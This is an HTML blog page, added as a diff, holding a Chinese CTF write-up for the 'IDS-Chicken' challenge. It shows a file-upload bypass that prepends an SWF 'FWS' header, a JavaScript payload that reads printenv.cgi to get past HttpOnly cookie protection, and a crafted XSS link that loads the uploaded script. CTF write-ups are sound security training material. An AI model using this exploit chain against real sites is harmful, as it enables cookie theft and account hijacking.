@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+<meta charset="utf-8" />
+<meta name="author" content="" />
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+<meta name="generator" content="Hugo 0.26" />
+
+<link rel="canonical" href="http://caijiji.github.io/2016/04/25/ids-chicken-writeup/">
+<base href="http://caijiji.github.io/" />
+<meta property="og:title" content="IDS-Chicken Writeup" />
+<meta property="og:description" content="IDS-Chicken Writeup(CCTF)
+
+感觉这题也没多少菊苣想撸所以就写一个writeup mark一下
+
+题目想法来自与detectify实验室的一篇Bypass CSP的paper和某公司IDS系统报警存在xss而拼凑成的题目
+
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://caijiji.github.io/2016/04/25/ids-chicken-writeup/" />
+
+
+
+<meta property="article:published_time" content="2016-04-25T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2016-04-25T00:00:00&#43;00:00"/>
+
+
+
+
+
+
+
+
+
+
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="IDS-Chicken Writeup"/>
+<meta name="twitter:description" content="IDS-Chicken Writeup(CCTF)
+
+感觉这题也没多少菊苣想撸所以就写一个writeup mark一下
+
+题目想法来自与detectify实验室的一篇Bypass CSP的paper和某公司IDS系统报警存在xss而拼凑成的题目
+
+"/>
+
+
+
+<meta itemprop="name" content="IDS-Chicken Writeup">
+<meta itemprop="description" content="IDS-Chicken Writeup(CCTF)
+
+感觉这题也没多少菊苣想撸所以就写一个writeup mark一下
+
+题目想法来自与detectify实验室的一篇Bypass CSP的paper和某公司IDS系统报警存在xss而拼凑成的题目
+
+">
+
+
+<meta itemprop="dateModified" content="2016-04-25T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="139">
+
+
+
+<meta itemprop="keywords" content="CTF," />
+
+
+<link rel="stylesheet" href="css/layout.css" />
+<link rel="stylesheet" href="css/color-dark.css" />
+
+
+
+<title>
+
+
+     IDS-Chicken Writeup 
+
+</title>
+
+<script src="js/highlight.min.js"></script>
+<link rel="stylesheet" href="css/tomorrow-night.min.css" />
+<script>hljs.initHighlightingOnLoad();</script>
+
+</head>
+
+
+<body>
+<div class="main">
+<header>
+
+<div class="header-bar">
+
+  <nav>
+    <div class="siteTitle">
+      <a href="http://caijiji.github.io/">菜狗小陈</a>
+    </div> 
+
+    
+    
+    <a class="nav-item" href="/about/"><div class="nav-item-title">About</div></a>
+    
+    <a class="nav-item" href="/friend/"><div class="nav-item-title">Friend</div></a>
+    
+    <a class="nav-item" href="https://Github.com/Caijiji"><div class="nav-item-title">GitHub</div></a>
+    
+    <a class="nav-item" href="https://twitter.com/Croxy_cn"><div class="nav-item-title">Twitter</div></a>
+    
+
+  </nav>
+</div>
+
+  
+<div class="social-links-header">
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</div>
+
+
+</header>
+
+
+<article class="post">
+    <h1 class="title"> IDS-Chicken Writeup </h1>
+    <div class="content"> <h2 id="ids-chicken-writeup-cctf">IDS-Chicken Writeup(CCTF)</h2>
+
+<p>感觉这题也没多少菊苣想撸所以就写一个writeup mark一下</p>
+
+<p>题目想法来自与detectify实验室的一篇Bypass CSP的paper和某公司IDS系统报警存在xss而拼凑成的题目</p>
+
+<p></p>
+
+<p><a href="https://labs.detectify.com/2015/05/28/building-an-xss-polyglot-through-swf-and-csp/">paper点我</a></p>
+
+<p>题目一开始的注入其实只是一个烟雾 主要作用是通过触发Mysql Error从而记录到IDS报警消息中</p>
+
+<p>根据Hint 我们要扫一波目录 可以成功跑到</p>
+
+<pre><code>http://ids.c-chicken.cc/upload/
+http://ids.c-chicken.cc/upload.php
+http://ids.c-chicken.cc/conn.php
+http://ids.c-chicken.cc/index.php
+http://ids.c-chicken.cc/cgi-bin/
+http://ids.c-chicken.cc/cgi-bin/printenv.cgi
+</code></pre>
+
+<p>根据Hint 发现上传还可以上传swf文件</p>
+
+<p>而我们知道PHP并没有成熟的swf文件检测机制和转换机制 而图片有成熟的check机制</p>
+
+<p>所以判断上传swf的时候只是简单的检测了一下文件头 在添加对应的文件头就可以成功bypass上传 添加入恶意的代码</p>
+
+<p>但是由于文件头的存在后面会遇到比较尴尬的错误 会提示</p>
+
+<pre><code>FWS is not defined
+</code></pre>
+
+<p>我们可以通过自定义id来bypass这个错误</p>
+
+<p>根据提示可以看到管理是存在httponly 所以可以通过获取printenv.cgi的内容来GetHttponly :)</p>
+
+<p>比较多的烟雾蛋:( sadness</p>
+
+<p>最后给个payload</p>
+
+<pre><code>FWS	;
+
+function initRequest()
+{
+    var request = false;
+    if(window.XMLHttpRequest) {         //FireFox
+    request = new XMLHttpRequest();
+    if (request.overrideMimeType) {
+      request.overrideMimeType('text/xml');
+    }
+  }
+  else if (window.ActiveXObject) {    //IE
+    try {
+      request = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
+    } catch (e) {
+      try {
+        request = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+      } catch (e) {}
+    }
+  }
+  if (!request) {
+    window.alert(&quot;Create request error!&quot;);
+    return false;
+  }
+  return request;
+}
+
+var http_request;
+function send(sendUrl,sendData)
+{
+  http_request = initRequest();
+  http_request.onreadystatechange = ajax_call_back;
+    
+  http_request.open(&quot;GET&quot;, sendUrl,true);
+  http_request.send(sendData);
+  
+}
+
+function ajax_call_back()
+{
+  if (http_request.readyState == 4) {
+    if (http_request.status == 200) {
+      var str = http_request.responseText;
+      alert(str);
+    }
+    }
+  }
+
+send('http://ids.c-chicken.cc/cgi-bin/printenv.cgi','test')
+
+</code></pre>
+
+<p><a href="http://ids.c-chicken.cc/index.php?id=1%27%3Cscript%20id=FWS%20src=%27/upload/20160425112757%27%3E%3C/script%3E">click me</a></p> </div>
+    <footer class="post-footer">
+
+  <div class="post-footer-data">
+    
+<div class="tags">
+    
+      <div class="tag">
+        <a href="/tags/ctf">#CTF</a>
+      </div>
+    
+</div>
+
+    <div class="date"> Apr 25, 2016 </div>
+  </div>
+
+</footer>
+
+
+  
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+
+(function() {
+    
+    
+    if (window.location.hostname == "localhost")
+        return;
+
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    var disqus_shortname = 'Croxy';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>
+  Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+</noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+</article>
+
+  <footer>
+
+  <div class="social-links-footer">
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <div class="social-link">
+  <a href="http://caijiji.github.io/index.xml" target="_blank">RSS</a>
+  </div>
+
+</div>
+
+
+  <div class="copyright">  </div>
+
+  <div class="poweredby">
+    Powered by <a href="https://gohugo.io/">Hugo</a>.
+  </div>
+
+  </footer>
+
+</body>
+</html>
+
